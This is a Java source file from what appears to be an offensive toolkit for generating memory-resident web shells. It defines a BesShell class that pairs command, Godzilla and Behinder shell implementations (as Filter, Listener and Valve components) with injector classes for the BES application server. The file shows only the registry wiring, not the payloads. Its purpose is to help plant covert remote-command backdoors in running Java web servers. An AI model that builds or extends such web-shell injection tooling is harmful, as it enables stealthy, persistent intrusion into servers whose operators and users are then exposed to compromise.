package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.bes.behinder.BehinderValve;
import com.reajason.javaweb.memshell.bes.command.CommandValve;
import com.reajason.javaweb.memshell.bes.godzilla.GodzillaValve;
import com.reajason.javaweb.memshell.bes.injector.BesFilterInjector;
import com.reajason.javaweb.memshell.bes.injector.BesListenerInjector;
import com.reajason.javaweb.memshell.bes.injector.BesValveInjector;
import com.reajason.javaweb.memshell.config.Constants;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.tomcat.behinder.BehinderListener;
import com.reajason.javaweb.memshell.tomcat.command.CommandListener;
import com.reajason.javaweb.memshell.tomcat.godzilla.GodzillaListener;
import org.apache.commons.lang3.tuple.Pair;

import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class BesShell extends AbstractShell {
    public static final String VALVE = "Valve";
    public static final String JAKARTA_VALVE = "JakartaValve";

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        return Map.of(
                Constants.FILTER, Pair.of(CommandFilter.class, BesFilterInjector.class),
                Constants.LISTENER, Pair.of(CommandListener.class, BesListenerInjector.class),
                VALVE, Pair.of(CommandValve.class, BesValveInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        return Map.of(
                Constants.FILTER, Pair.of(GodzillaFilter.class, BesFilterInjector.class),
                Constants.LISTENER, Pair.of(GodzillaListener.class, BesListenerInjector.class),
                VALVE, Pair.of(GodzillaValve.class, BesValveInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        return Map.of(
                Constants.FILTER, Pair.of(BehinderFilter.class, BesFilterInjector.class),
                Constants.LISTENER, Pair.of(BehinderListener.class, BesListenerInjector.class),
                VALVE, Pair.of(BehinderValve.class, BesValveInjector.class)
        );
    }
}
